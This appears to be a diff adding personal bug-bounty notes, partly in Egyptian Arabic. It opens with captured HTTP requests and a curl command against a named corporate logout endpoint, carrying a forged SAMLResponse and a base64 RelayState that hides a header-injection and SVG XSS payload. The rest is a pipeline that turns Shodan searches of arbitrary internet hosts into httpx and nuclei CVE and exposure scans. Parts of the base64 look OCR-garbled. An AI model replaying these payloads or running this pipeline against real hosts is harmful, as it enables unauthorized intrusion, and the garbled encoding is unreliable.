@@ -1,0 +1,103 @@
+
+burp::::::tools 
+POST /cgi/logout HTTP/1.1
+Host: <sitetarget.com>
+Accept: */*
+User-Agent: Mozilla/5.0 {Windows NT 10.0; Win64; x64} ApplewebKit/537.36 (KHTML, like Gecko)
+Chrome/60.0.3112.113 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Content-Length: 513
+Connection: keep-alive
+
+
+json :::::::;
+curl -k -L -x 127.0.0.1:8080 -X POST 
+"https://target.com/cgi/logout" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0;  Win64;  x64)  AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/60.0.3112.113  Safari/537.36" \
+  -H "Host:  target.com" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d
+"SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPHNhbWxw0lJlc3BvbnNlIHhtbG5z0nNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1s0kFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1s0k5hbWVJRD50ZXN0QGV4YW1wbGUuY29TPC9zYW1s0k5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==" \
+	--proxy-insecure
+
+
+POST /cgi/logout HTTP/1.1
+Host: dub-hdx.paypalcorp.com
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Chrome/60.0.3112.113 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 513
+Connection: Keep-alive
+SAMLResponse=
+PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG 9jb2wiIELEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLj
+A6YXNzZXJ0aW9uIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5OZXN0QGV4YW1wbGUuY29tPC9zYW
+1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJOaW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&ReLayState=
+DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FKPWFsZXJ0KDEpPg==
+
+install shodan::::::
+pip install shodan 
+pip3 install shodan
+shodan --help
+ ادخل علي  https://account.shodan.io    وانسخ  API Key 
+shodan init YOUR_API_KEY
+shodan init AbCdEf123456	
+لو تمام هتشوف الرساله دي  Successfully initialized Shodan
+shodan host 8.8.8.8
+shodan search apache
+shodan search "nginx country:EG"
+shodan search apache --limit 100 --fields ip_str,port,org > results.txt
+shodan search ssh
+
+shodan >> Targets >> httpx >> nuclei
+shodan --help
+nuclei -version
+httpx -version
+
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+
+nuclei -update-templates 
+shodan search "nginx country:EG" --limit 200 --fields ip_str > ips.txt
+cat ips.txt | httpx -silent -o live.txt
+nuclei -l live.txt
+nuclei -l live.txt -t misconfiguration/
+nuclei -l live.txt -t exposures/
+nuclei -l live.txt -t cves/
+
+✅ الحلول الصحيحة (اختار واحد) 
+🥇 الحل الأفضل (الموصى به): Virtual Environment
+ده الصح لأي أداة زي Shodan Hunter 👌
+🔹 الخطوات:
+1️⃣ تثبيت venv (لو مش موجود)
+sudo apt update
+sudo apt install python3-venv -y
+2️⃣ إنشاء بيئة افتراضية
+python3 -m venv shodan-env
+3️⃣ تفعيل البيئة
+source shodan-env/bin/activate
+هتشوف اسمها كده:
+(shodan-env) root@kali:~#
+4️⃣ ثبت اللي انت عايزه براحتك
+pip install shodan requests
+✅ كده المشكلة اتحلت نهائيًا
+
+mkdir livehunter
+cd livehunter
+python3 -m venv venv
+source venv/bin/activate
+pip install shodan requests colorama
+./shodanhunter.py -qf query.txt -d target.com -o assets.txt
+cat assets.txt | httpx -silent > live.txt
+nuclei -l live.txt -t exposures/
+
+🔥 الحقيقة اللي محدش بيقولها
+90% من Bug Bounty Hunters
+مش معتمدين على Shodan لوحده
+بيستخدموا:
+Amass
+Subfinder
+Censys
+GitHub Dorks
+DNS + ASN Recon
+وشodan مجرد زيادة قوة مش الأساس.
